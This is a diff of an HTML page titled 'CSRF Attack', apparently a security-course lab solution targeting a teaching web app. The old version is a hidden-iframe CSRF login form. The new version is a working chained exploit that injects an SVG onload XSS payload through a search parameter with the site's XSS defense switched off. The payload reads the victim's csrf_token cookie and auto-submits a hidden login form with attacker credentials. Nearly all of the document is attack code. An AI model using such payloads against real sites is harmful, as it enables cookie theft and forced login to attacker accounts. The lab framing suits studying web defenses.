@@ -1,38 +1,55 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <iframe name="stealth_frame" style="display:none;"></iframe>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
 
-    <form id="csrf_form" action="https://bungle.sysnet.ucsd.edu/login" method="POST" target="stealth_frame">
-      <input type="hidden" name="username" value="attacker">
-      <input type="hidden" name="password" value="l33th4x">
-    </form>
+    <iframe style="display:none" src=""></iframe>
 
     <script>
-      window.onload = function() {
-	function setCookie(name,value,days) {
-    var expires = "";
-    if (days) {
-        var date = new Date();
-        date.setTime(date.getTime() + (days*24*60*60*1000));
-        expires = "; expires=" + date.toUTCString();
-    }
-    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
-}
-function getCookie(name) {
-    var nameEQ = name + "=";
-    var ca = document.cookie.split(';');
-    for(var i=0;i < ca.length;i++) {
-        var c = ca[i];
-        while (c.charAt(0)==' ') c = c.substring(1,c.length);
-        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
-    }
-    return null;
-}
-	
-      	setCookie(csrf_token, getCookie("csrf_token"), 100);
-        document.getElementById('csrf_form').submit();
-      };
+        // 1. Define the Malicious Payload (The XSS)
+        // This code runs INSIDE bungle.sysnet.ucsd.edu
+        const xssPayload = `
+            <svg/onload="
+                // A. Steal the CSRF token from the victim's cookies
+                var token = document.cookie.match(/csrf_token=([a-zA-Z0-9]+)/)[1];
+
+                // B. Create a hidden form pointing to the login page
+                var form = document.createElement('form');
+                form.action = './login?csrfdefense=1&xssdefense=0';
+                form.method = 'POST';
+
+                // C. Add the required fields
+                var inputs = {
+                    'username': 'attacker',
+                    'password': 'l33th4x',
+                    'csrf_token': token
+                };
+
+                for (var key in inputs) {
+                    var input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = inputs[key];
+                    form.appendChild(input);
+                }
+
+                // D. Append and Submit instantly
+                document.body.appendChild(form);
+                form.submit();
+            ">
+        `;
+
+        // 2. Construct the Target URL
+        // We inject the payload into the 'q' parameter of the search page.
+        // We use xssdefense=0 to ensure the SVG tag isn't sanitized.
+        const target = "https://bungle.sysnet.ucsd.edu/search?xssdefense=0&q=" + encodeURIComponent(xssPayload);
+
+        // 3. Launch the Attack
+        // Set the iframe source to trigger the XSS
+        document.querySelector('iframe').src = target;
     </script>
-  </body>
+
+</body>
 </html>
